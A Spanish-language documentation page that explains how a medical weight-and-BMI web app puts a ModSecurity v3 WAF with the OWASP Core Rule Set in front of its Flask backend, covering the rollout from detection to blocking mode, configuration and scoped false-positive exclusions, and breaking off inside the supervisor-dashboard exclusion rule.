<!doctype html>
<html class="no-js" lang="en" data-content_root="../">
  <head><meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
<link rel="index" title="Index" href="../genindex.html"><link rel="search" title="Search" href="../search.html">

    <!-- Generated with Sphinx 8.1.3 and Furo 2025.12.19 -->
        <title>WAF: ModSecurity v3 + OWASP Core Rule Set (CRS) - Medical Register 0.1.0 documentation</title>
      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=d111a655" />
    <link rel="stylesheet" type="text/css" href="../_static/styles/furo.css?v=7bdb33bb" />
    <link rel="stylesheet" type="text/css" href="../_static/styles/furo-extensions.css?v=8dab3a3b" />
    
    


<style>
  body {
    --color-code-background: #f2f2f2;
  --color-code-foreground: #1e1e1e;
  --color-brand-primary: #254F6D;
  --color-brand-content: #254F6D;
  
  }
  @media not print {
    body[data-theme="dark"] {
      --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
    }
    @media (prefers-color-scheme: dark) {
      body:not([data-theme="light"]) {
        --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
      }
    }
  }
</style></head>
  <body>
    
    <script>
      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
    </script>
    

<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
  <symbol id="svg-toc" viewBox="0 0 24 24">
    <title>Contents</title>
    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
    </svg>
  </symbol>
  <symbol id="svg-menu" viewBox="0 0 24 24">
    <title>Menu</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
      <line x1="3" y1="12" x2="21" y2="12"></line>
      <line x1="3" y1="6" x2="21" y2="6"></line>
      <line x1="3" y1="18" x2="21" y2="18"></line>
    </svg>
  </symbol>
  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
    <title>Expand</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
      <polyline points="9 18 15 12 9 6"></polyline>
    </svg>
  </symbol>
  <symbol id="svg-sun" viewBox="0 0 24 24">
    <title>Light mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
      <circle cx="12" cy="12" r="5"></circle>
      <line x1="12" y1="1" x2="12" y2="3"></line>
      <line x1="12" y1="21" x2="12" y2="23"></line>
      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
      <line x1="1" y1="12" x2="3" y2="12"></line>
      <line x1="21" y1="12" x2="23" y2="12"></line>
      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
    </svg>
  </symbol>
  <symbol id="svg-moon" viewBox="0 0 24 24">
    <title>Dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
    </svg>
  </symbol>
  <symbol id="svg-sun-with-moon" viewBox="0 0 24 24">
    <title>Auto light/dark, in light mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1" stroke-linecap="round" stroke-linejoin="round"
      class="icon-custom-derived-from-feather-sun-and-tabler-moon">
      <path style="opacity: 50%" d="M 5.411 14.504 C 5.471 14.504 5.532 14.504 5.591 14.504 C 3.639 16.319 4.383 19.569 6.931 20.352 C 7.693 20.586 8.512 20.551 9.25 20.252 C 8.023 23.207 4.056 23.725 2.11 21.184 C 0.166 18.642 1.702 14.949 4.874 14.536 C 5.051 14.512 5.231 14.5 5.411 14.5 L 5.411 14.504 Z"/>
      <line x1="14.5" y1="3.25" x2="14.5" y2="1.25"/>
      <line x1="14.5" y1="15.85" x2="14.5" y2="17.85"/>
      <line x1="10.044" y1="5.094" x2="8.63" y2="3.68"/>
      <line x1="19" y1="14.05" x2="20.414" y2="15.464"/>
      <line x1="8.2" y1="9.55" x2="6.2" y2="9.55"/>
      <line x1="20.8" y1="9.55" x2="22.8" y2="9.55"/>
      <line x1="10.044" y1="14.006" x2="8.63" y2="15.42"/>
      <line x1="19" y1="5.05" x2="20.414" y2="3.636"/>
      <circle cx="14.5" cy="9.55" r="3.6"/>
    </svg>
  </symbol>
  <symbol id="svg-moon-with-sun" viewBox="0 0 24 24">
    <title>Auto light/dark, in dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1" stroke-linecap="round" stroke-linejoin="round"
      class="icon-custom-derived-from-feather-sun-and-tabler-moon">
      <path d="M 8.282 7.007 C 8.385 7.007 8.494 7.007 8.595 7.007 C 5.18 10.184 6.481 15.869 10.942 17.24 C 12.275 17.648 13.706 17.589 15 17.066 C 12.851 22.236 5.91 23.143 2.505 18.696 C -0.897 14.249 1.791 7.786 7.342 7.063 C 7.652 7.021 7.965 7 8.282 7 L 8.282 7.007 Z"/>
      <line style="opacity: 50%" x1="18" y1="3.705" x2="18" y2="2.5"/>
      <line style="opacity: 50%" x1="18" y1="11.295" x2="18" y2="12.5"/>
      <line style="opacity: 50%" x1="15.316" y1="4.816" x2="14.464" y2="3.964"/>
      <line style="opacity: 50%" x1="20.711" y1="10.212" x2="21.563" y2="11.063"/>
      <line style="opacity: 50%" x1="14.205" y1="7.5" x2="13.001" y2="7.5"/>
      <line style="opacity: 50%" x1="21.795" y1="7.5" x2="23" y2="7.5"/>
      <line style="opacity: 50%" x1="15.316" y1="10.184" x2="14.464" y2="11.036"/>
      <line style="opacity: 50%" x1="20.711" y1="4.789" x2="21.563" y2="3.937"/>
      <circle style="opacity: 50%" cx="18" cy="7.5" r="2.169"/>
    </svg>
  </symbol>
  <symbol id="svg-pencil" viewBox="0 0 24 24">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-pencil-code">
      <path d="M4 20h4l10.5 -10.5a2.828 2.828 0 1 0 -4 -4l-10.5 10.5v4" />
      <path d="M13.5 6.5l4 4" />
      <path d="M20 21l2 -2l-2 -2" />
      <path d="M17 17l-2 2l2 2" />
    </svg>
  </symbol>
  <symbol id="svg-eye" viewBox="0 0 24 24">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-eye-code">
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" />
      <path
        d="M11.11 17.958c-3.209 -.307 -5.91 -2.293 -8.11 -5.958c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6c-.21 .352 -.427 .688 -.647 1.008" />
      <path d="M20 21l2 -2l-2 -2" />
      <path d="M17 17l-2 2l2 2" />
    </svg>
  </symbol>
</svg>

<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation" aria-label="Toggle site navigation sidebar">
<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc" aria-label="Toggle table of contents sidebar">
<label class="overlay sidebar-overlay" for="__navigation"></label>
<label class="overlay toc-overlay" for="__toc"></label>

<a class="skip-to-content muted-link" href="#furo-main-content">Skip to content</a>



<div class="page">
  <header class="mobile-header">
    <div class="header-left">
      <label class="nav-overlay-icon" for="__navigation">
        <span class="icon"><svg><use href="#svg-menu"></use></svg></span>
      </label>
    </div>
    <div class="header-center">
      <a href="../index.html"><div class="brand">Medical Register 0.1.0 documentation</div></a>
    </div>
    <div class="header-right">
      <div class="theme-toggle-container theme-toggle-header">
        <button class="theme-toggle" aria-label="Toggle Light / Dark / Auto color theme">
          <svg class="theme-icon-when-auto-light"><use href="#svg-sun-with-moon"></use></svg>
          <svg class="theme-icon-when-auto-dark"><use href="#svg-moon-with-sun"></use></svg>
          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
        </button>
      </div>
      <label class="toc-overlay-icon toc-header-icon" for="__toc">
        <span class="icon"><svg><use href="#svg-toc"></use></svg></span>
      </label>
    </div>
  </header>
  <aside class="sidebar-drawer">
    <div class="sidebar-container">
      
      <div class="sidebar-sticky"><a class="sidebar-brand" href="../index.html">
  
  
</a><form class="sidebar-search-container" method="get" action="../search.html" role="search">
  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
  <input type="hidden" name="check_keywords" value="yes">
  <input type="hidden" name="area" value="default">
</form>
<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
  <p class="caption" role="heading"><span class="caption-text">Contenido:</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../manual.html">Manual de Usuario - Registro Personal de Peso e IMC</a></li>
<li class="toctree-l1"><a class="reference internal" href="../requeriments.html">Requerimientos Funcionales</a></li>
<li class="toctree-l1"><a class="reference internal" href="../INFORME_SEGURIDAD.html">Informe de Análisis de Seguridad - Aplicación Médica</a></li>
<li class="toctree-l1"><a class="reference internal" href="../INICIO_RAPIDO.html">Inicio Rápido</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mockups/MOCKUPS.html">Mockups y Diagramas</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">DefectDojo:</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../defectdojo/ANALISIS_CWE_699.html">Análisis de Seguridad según CWE-699</a></li>
<li class="toctree-l1"><a class="reference internal" href="../defectdojo/ESTADO_ACTUAL_CWE_699.html">Estado Actual del Programa - Análisis CWE-699</a></li>
<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_CONFIGURACION.html">Configuración de DefectDojo</a></li>
<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_CREDENTIALS.html">Credenciales de DefectDojo</a></li>
<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_DATABASE.html">Gestión de Base de Datos de DefectDojo</a></li>
<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_INTEGRATION.html">Integración de DefectDojo</a></li>
<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_FLUJO_CREACION_RESOLUCION.html">Flujo de Creación y Resolución de Findings en DefectDojo</a></li>
<li class="toctree-l1"><a class="reference internal" href="../defectdojo/DEFECTDOJO_FLUJO_IMPLEMENTADO.html">Flujo de Creación → Resolución Implementado en DefectDojo</a></li>
<li class="toctree-l1"><a class="reference internal" href="../defectdojo/MAKE_ALL_USO.html">Uso de <code class="docutils literal notranslate"><span class="pre">make</span> <span class="pre">update</span></code> - Flujo Completo de DefectDojo</a></li>
</ul>

</div>
</div>

      </div>
      
    </div>
  </aside>
  <div class="main">
    <div class="content">
      <div class="article-container">
        <a href="#" class="back-to-top muted-link">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
          </svg>
          <span>Back to top</span>
        </a>
        <div class="content-icon-container">
          <div class="view-this-page">
  <a class="muted-link" href="../_sources/seguridad/06-waf-modsecurity.md.txt" title="View this page">
    <svg><use href="#svg-eye"></use></svg>
    <span class="visually-hidden">View this page</span>
  </a>
</div>
<div class="theme-toggle-container theme-toggle-content">
            <button class="theme-toggle" aria-label="Toggle Light / Dark / Auto color theme">
              <svg class="theme-icon-when-auto-light"><use href="#svg-sun-with-moon"></use></svg>
              <svg class="theme-icon-when-auto-dark"><use href="#svg-moon-with-sun"></use></svg>
              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
            </button>
          </div>
          <label class="toc-overlay-icon toc-content-icon" for="__toc">
            <span class="icon"><svg><use href="#svg-toc"></use></svg></span>
          </label>
        </div>
        <article role="main" id="furo-main-content">
          <section id="waf-modsecurity-v3-owasp-core-rule-set-crs">
<h1>WAF: ModSecurity v3 + OWASP Core Rule Set (CRS)<a class="headerlink" href="#waf-modsecurity-v3-owasp-core-rule-set-crs" title="Link to this heading">¶</a></h1>
<section id="que-es-y-por-que-se-usa">
<h2>1. Qué es y por qué se usa<a class="headerlink" href="#que-es-y-por-que-se-usa" title="Link to this heading">¶</a></h2>
<p>Un <strong>WAF (Web Application Firewall)</strong> es un cortafuegos de aplicación que inspecciona el tráfico HTTP en busca de patrones maliciosos antes de que las peticiones lleguen al backend. A diferencia de un firewall de red (capas 3-4), un WAF opera en la capa 7 (aplicación) y puede analizar el contenido de las peticiones: cabeceras, query strings, cuerpos JSON/formulario, cookies, etc.</p>
<p>En esta aplicación se despliega <strong>ModSecurity v3</strong> (motor WAF open source, mantenido por Trustwave/OWASP) junto con el <strong>OWASP Core Rule Set (CRS)</strong>, el conjunto de reglas estándar de la industria que cubre las categorías de ataques más comunes (OWASP Top 10).</p>
<section id="que-aporta-a-la-aplicacion">
<h3>Qué aporta a la aplicación<a class="headerlink" href="#que-aporta-a-la-aplicacion" title="Link to this heading">¶</a></h3>
<ul class="simple">
<li><p><strong>Defensa en profundidad</strong>: las validaciones de entrada del backend (<code class="docutils literal notranslate"><span class="pre">app/helpers.py</span></code>) protegen contra datos malformados; el WAF actúa como <strong>capa adicional</strong> que bloquea ataques conocidos antes de que lleguen al código de la aplicación.</p></li>
<li><p><strong>Protección contra ataques genéricos</strong>: SQL injection, XSS, path traversal, command injection, scanners automatizados, etc.</p></li>
<li><p><strong>Prevención de exfiltración de datos</strong>: inspección de respuestas (outbound filtering) para bloquear fugas de información sensible (números de tarjeta, rutas del sistema, volcados de BD, stack traces).</p></li>
<li><p><strong>Sin cambios en el código</strong>: el WAF se despliega como reverse proxy delante del backend; la aplicación Flask no necesita modificaciones.</p></li>
<li><p><strong>Ocultación del backend</strong>: el usuario se conecta al WAF (Nginx); el backend Flask no es accesible directamente desde fuera de la red Docker.</p></li>
</ul>
</section>
</section>
<hr class="docutils" />
<section id="arquitectura">
<h2>2. Arquitectura<a class="headerlink" href="#arquitectura" title="Link to this heading">¶</a></h2>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                    ┌──────────────────────────────────────────────┐
                    │              Red Docker (proxy-network)       │
                    │                                              │
 Usuario :5001 ──▶  │  WAF (Nginx + ModSecurity + CRS)  ──▶  Flask │
                    │  owasp/modsecurity-crs:nginx-alpine    :5001 │
                    │  contenedor: waf_modsecurity            web   │
                    │                                              │
                    └──────────────────────────────────────────────┘
</pre></div>
</div>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Componente</p></th>
<th class="head"><p>Detalle</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><strong>Imagen Docker</strong></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">owasp/modsecurity-crs:nginx-alpine</span></code> (imagen oficial OWASP)</p></td>
</tr>
<tr class="row-odd"><td><p><strong>Contenedor</strong></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">waf_modsecurity</span></code></p></td>
</tr>
<tr class="row-even"><td><p><strong>Puerto expuesto</strong></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">5001</span></code> (host) → <code class="docutils literal notranslate"><span class="pre">8080</span></code> (contenedor WAF)</p></td>
</tr>
<tr class="row-odd"><td><p><strong>Backend</strong></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">http://web:5001</span></code> (solo accesible dentro de la red Docker)</p></td>
</tr>
<tr class="row-even"><td><p><strong>Arranque</strong></p></td>
<td><p>Automático con <code class="docutils literal notranslate"><span class="pre">make</span></code> o <code class="docutils literal notranslate"><span class="pre">docker-compose</span> <span class="pre">up</span> <span class="pre">-d</span></code>. No requiere perfil.</p></td>
</tr>
<tr class="row-odd"><td><p><strong>Dependencia</strong></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">depends_on:</span> <span class="pre">web:</span> <span class="pre">condition:</span> <span class="pre">service_healthy</span></code> — el WAF espera a que Flask esté sano antes de aceptar tráfico.</p></td>
</tr>
</tbody>
</table>
</div>
<p>El servicio <code class="docutils literal notranslate"><span class="pre">web</span></code> (Flask/Gunicorn) usa <code class="docutils literal notranslate"><span class="pre">expose:</span> <span class="pre">&quot;5001&quot;</span></code> en lugar de <code class="docutils literal notranslate"><span class="pre">ports</span></code>, por lo que <strong>no publica</strong> su puerto en el host. Toda petición del usuario pasa obligatoriamente por el WAF.</p>
</section>
<hr class="docutils" />
<section id="proceso-de-despliegue-detectiononly-on">
<h2>3. Proceso de despliegue: DetectionOnly → On<a class="headerlink" href="#proceso-de-despliegue-detectiononly-on" title="Link to this heading">¶</a></h2>
<p>El despliegue se realizó siguiendo la metodología recomendada en dos fases:</p>
<section id="fase-1-modo-detectiononly-observacion">
<h3>Fase 1: Modo DetectionOnly (observación)<a class="headerlink" href="#fase-1-modo-detectiononly-observacion" title="Link to this heading">¶</a></h3>
<p>Se configuró <code class="docutils literal notranslate"><span class="pre">MODSEC_RULE_ENGINE=DetectionOnly</span></code> para que el WAF registrase las alertas en los logs <strong>sin bloquear</strong> ninguna petición:</p>
<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="c1"># docker-compose.yml → servicio waf → environment</span>
<span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MODSEC_RULE_ENGINE=DetectionOnly</span>
</pre></div>
</div>
<p>En esta fase se navegó por toda la aplicación (registro, login, perfil, pesos, supervisor) y se ejecutaron ataques de prueba. Los logs mostraron:</p>
<ul class="simple">
<li><p>Qué reglas se activaban con tráfico legítimo (falsos positivos).</p></li>
<li><p>Qué ataques eran correctamente detectados (verdaderos positivos).</p></li>
<li><p>El scoring de anomalía acumulado por cada petición.</p></li>
</ul>
<p><strong>Resultado</strong>: se identificaron 4 falsos positivos (sección 5) y se redactaron las exclusiones.</p>
</section>
<section id="fase-2-modo-on-bloqueo">
<h3>Fase 2: Modo On (bloqueo)<a class="headerlink" href="#fase-2-modo-on-bloqueo" title="Link to this heading">¶</a></h3>
<p>Tras verificar que las exclusiones cubrían todos los falsos positivos, se cambió a modo bloqueo:</p>
<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MODSEC_RULE_ENGINE=On</span>
</pre></div>
</div>
<p>Se repitieron todas las pruebas: los ataques devolvían HTTP 403 y el tráfico legítimo pasaba sin problemas (HTTP 200).</p>
</section>
</section>
<hr class="docutils" />
<section id="configuracion">
<h2>4. Configuración<a class="headerlink" href="#configuracion" title="Link to this heading">¶</a></h2>
<p>Las variables de entorno del contenedor WAF se definen en <code class="docutils literal notranslate"><span class="pre">docker-compose.yml</span></code> → servicio <code class="docutils literal notranslate"><span class="pre">waf</span></code>:</p>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Variable</p></th>
<th class="head"><p>Valor</p></th>
<th class="head"><p>Descripción</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">BACKEND</span></code></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">http://web:5001</span></code></p></td>
<td><p>URL interna del backend Flask al que el WAF reenvía las peticiones limpias</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">MODSEC_RULE_ENGINE</span></code></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">On</span></code></p></td>
<td><p>Modo de operación de ModSecurity: <code class="docutils literal notranslate"><span class="pre">On</span></code> bloquea; <code class="docutils literal notranslate"><span class="pre">DetectionOnly</span></code> solo registra</p></td>
</tr>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">PARANOIA</span></code></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">1</span></code></p></td>
<td><p>Paranoia Level del OWASP CRS (ver sección siguiente)</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">ANOMALY_INBOUND</span></code></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">5</span></code></p></td>
<td><p>Umbral de anomalía para peticiones entrantes</p></td>
</tr>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">ANOMALY_OUTBOUND</span></code></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">4</span></code></p></td>
<td><p>Umbral de anomalía para respuestas salientes</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">ALLOWED_METHODS</span></code></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">GET</span> <span class="pre">HEAD</span> <span class="pre">POST</span> <span class="pre">OPTIONS</span> <span class="pre">PUT</span> <span class="pre">DELETE</span></code></p></td>
<td><p>Métodos HTTP permitidos</p></td>
</tr>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">ALLOWED_REQUEST_CONTENT_TYPE</span></code></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">application/json</span></code>, <code class="docutils literal notranslate"><span class="pre">multipart/form-data</span></code>, etc.</p></td>
<td><p>Content-Types permitidos</p></td>
</tr>
</tbody>
</table>
</div>
<section id="paranoia-level-pl">
<h3>Paranoia Level (PL)<a class="headerlink" href="#paranoia-level-pl" title="Link to this heading">¶</a></h3>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>PL</p></th>
<th class="head"><p>Descripción</p></th>
<th class="head"><p>Falsos positivos</p></th>
<th class="head"><p>Uso recomendado</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><strong>1</strong></p></td>
<td><p>Solo reglas de alta confianza.</p></td>
<td><p>Muy bajo</p></td>
<td><p><strong>Producción general</strong> (valor actual)</p></td>
</tr>
<tr class="row-odd"><td><p>2</p></td>
<td><p>Reglas adicionales de confianza media.</p></td>
<td><p>Bajo-medio</p></td>
<td><p>Datos sensibles con tiempo para ajustar</p></td>
</tr>
<tr class="row-even"><td><p>3</p></td>
<td><p>Reglas agresivas.</p></td>
<td><p>Medio-alto</p></td>
<td><p>Alta seguridad con exclusiones bien ajustadas</p></td>
</tr>
<tr class="row-odd"><td><p>4</p></td>
<td><p>Máxima detección.</p></td>
<td><p>Muy alto</p></td>
<td><p>Solo pruebas o entornos muy controlados</p></td>
</tr>
</tbody>
</table>
</div>
</section>
<section id="anomaly-scoring">
<h3>Anomaly Scoring<a class="headerlink" href="#anomaly-scoring" title="Link to this heading">¶</a></h3>
<p>ModSecurity CRS usa un modelo de <strong>anomaly scoring</strong>: cada regla que se activa suma puntos. La petición/respuesta se bloquea solo cuando el total acumulado alcanza el umbral.</p>
<ul class="simple">
<li><p><strong>Inbound (5)</strong>: una regla crítica (SQLi, XSS) normalmente suma 5 puntos → bloqueo inmediato.</p></li>
<li><p><strong>Outbound (4)</strong>: protege contra fugas de información en las respuestas.</p></li>
</ul>
</section>
</section>
<hr class="docutils" />
<section id="analisis-de-falsos-positivos-y-exclusiones">
<h2>5. Análisis de falsos positivos y exclusiones<a class="headerlink" href="#analisis-de-falsos-positivos-y-exclusiones" title="Link to this heading">¶</a></h2>
<p>Fichero: <strong><code class="docutils literal notranslate"><span class="pre">waf/modsecurity-override.conf</span></code></strong></p>
<p>Este fichero se monta como regla <strong>AFTER-CRS</strong> (<code class="docutils literal notranslate"><span class="pre">RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf</span></code>). Las exclusiones se aplican <strong>después</strong> de cargar todas las reglas del Core Rule Set, lo que permite modificar el comportamiento de reglas específicas sin alterar el CRS original.</p>
<section id="falso-positivo-1-campo-password-en-login-register">
<h3>5.1. Falso positivo 1: Campo <code class="docutils literal notranslate"><span class="pre">password</span></code> en login/register<a class="headerlink" href="#falso-positivo-1-campo-password-en-login-register" title="Link to this heading">¶</a></h3>
<p><strong>Detección en logs (modo DetectionOnly):</strong></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ruleId</span><span class="p">:</span> <span class="s2">&quot;942100&quot;</span>
<span class="n">file</span><span class="p">:</span> <span class="s2">&quot;REQUEST-942-APPLICATION-ATTACK-SQLI.conf&quot;</span>
<span class="n">msg</span><span class="p">:</span> <span class="s2">&quot;SQL Injection Attack Detected via libinjection&quot;</span>
<span class="n">data</span><span class="p">:</span> <span class="s2">&quot;Matched Data: 1&amp;1 found within ARGS:password&quot;</span>
<span class="n">severity</span><span class="p">:</span> <span class="mi">2</span>
<span class="n">Inbound</span> <span class="n">Anomaly</span> <span class="n">Score</span><span class="p">:</span> <span class="mi">5</span>
</pre></div>
</div>
<p><strong>Causa</strong>: las contraseñas pueden contener caracteres como <code class="docutils literal notranslate"><span class="pre">'</span></code>, <code class="docutils literal notranslate"><span class="pre">&quot;</span></code>, <code class="docutils literal notranslate"><span class="pre">&lt;</span></code>, <code class="docutils literal notranslate"><span class="pre">&gt;</span></code>, <code class="docutils literal notranslate"><span class="pre">--</span></code>, <code class="docutils literal notranslate"><span class="pre">OR</span></code>, etc. que disparan reglas de inyección SQL (942xxx) y XSS (941xxx).</p>
<p><strong>Exclusión (regla 10001)</strong>:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>SecRule REQUEST_URI &quot;@beginsWith /api/auth/&quot;
    ctl:ruleRemoveTargetById=941100-941999;ARGS:password   ← XSS
    ctl:ruleRemoveTargetById=942100-942999;ARGS:password   ← SQLi
    ctl:ruleRemoveTargetById=920272;ARGS:password          ← Tamaño
</pre></div>
</div>
<p><strong>Justificación</strong>: la exclusión se aplica DESPUÉS del CRS (after-CRS) y es específica: solo afecta al campo <code class="docutils literal notranslate"><span class="pre">password</span></code> en las rutas <code class="docutils literal notranslate"><span class="pre">/api/auth/*</span></code>. El resto de campos y rutas siguen protegidos por las reglas completas. Se usa <code class="docutils literal notranslate"><span class="pre">ctl:ruleRemoveTargetById</span></code> para eliminar reglas concretas de un argumento concreto, no se desactiva ningún motor.</p>
</section>
<section id="falso-positivo-2-campo-recaptcha-token">
<h3>5.2. Falso positivo 2: Campo <code class="docutils literal notranslate"><span class="pre">recaptcha_token</span></code><a class="headerlink" href="#falso-positivo-2-campo-recaptcha-token" title="Link to this heading">¶</a></h3>
<p><strong>Causa</strong>: el token reCAPTCHA v3 es una cadena base64 larga que contiene secuencias que coinciden con patrones de inyección.</p>
<p><strong>Exclusión (regla 10002)</strong>: elimina reglas 941xxx y 942xxx solo para <code class="docutils literal notranslate"><span class="pre">ARGS:recaptcha_token</span></code> en <code class="docutils literal notranslate"><span class="pre">/api/auth/*</span></code>.</p>
</section>
<section id="falso-positivo-3-campos-first-name-last-name">
<h3>5.3. Falso positivo 3: Campos <code class="docutils literal notranslate"><span class="pre">first_name</span></code> / <code class="docutils literal notranslate"><span class="pre">last_name</span></code><a class="headerlink" href="#falso-positivo-3-campos-first-name-last-name" title="Link to this heading">¶</a></h3>
<p><strong>Causa</strong>: nombres con apóstrofes (O’Brien), acentos, guiones compuestos activan reglas de inyección.</p>
<p><strong>Exclusión (regla 10003)</strong>: elimina reglas 941xxx y 942xxx solo para <code class="docutils literal notranslate"><span class="pre">ARGS:first_name</span></code> y <code class="docutils literal notranslate"><span class="pre">ARGS:last_name</span></code> en <code class="docutils literal notranslate"><span class="pre">/api/user</span></code>.</p>
</section>
<section id="falso-positivo-4-dashboard-supervisor">
<h3>5.4. Falso positivo 4: Dashboard Supervisor<a class="headerlink" href="#falso-positivo-4-dashboard-supervisor" title="Link to this heading">¶</a></h3>
<p><strong>Causa</strong>: el supervisor es un dashboard de desarrollo que muestra estadísticas de tráfico, consultas y datos del sistema. Su contenido HTML/JS activa múltiples familias de reglas.</p>
<p><strong>Exclusión (reglas 10004 + 10005)</strong>: se eliminan <strong>familias de reglas por ID específico</strong> (NO se desactiva el motor del WAF):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>SecRule REQUEST_URI &quot;@beginsWith /supervisor&quot;
